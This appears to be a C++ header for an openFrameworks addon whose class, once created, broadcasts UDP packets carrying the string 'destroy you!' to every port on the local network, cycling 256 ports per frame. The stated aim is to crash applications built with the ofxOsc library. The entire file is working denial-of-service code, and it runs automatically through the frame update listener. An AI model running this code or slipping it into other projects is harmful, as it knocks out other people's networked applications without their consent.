//
//  ofxCrushAppsUsingOfxOsc.h
//
//  Created by ISHII 2bit on 2016/03/18.
//
//

#ifndef ofxCrushAppsUsingOfxOsc_h
#define ofxCrushAppsUsingOfxOsc_h

#include "ofMain.h"
#include "ofxUDPManager.h"

class ofxCrushAppsUsingOfxOsc {
    ofxUDPManager manager;
    std::string address;
    
    int portOffset() const {
        return (ofGetFrameNum() * 256) % 65536;
    }
public:
    ofxCrushAppsUsingOfxOsc()
    : address("255.255.255.255")
    {
        ofAddListener(ofEvents().update, this, &ofxCrushAppsUsingOfxOsc::update);
        manager.Create();
        manager.SetEnableBroadcast(true);
    }
    
    void setup(const std::string &address = "255.255.255.255") {
        this->address = address;
    }
    void update(ofEventArgs &) {
        int offset = portOffset();
        for(int i = 0; i < 256; i++) {
            if(manager.Connect(address.c_str(), offset + i)) {
                manager.SendAll("destroy you!", 13);
            } else {
                ofLogWarning() << "can't connect" << offset + i;
            }
        }
    }
};

#endif /* ofxCrushAppsUsingOfxOsc_h */
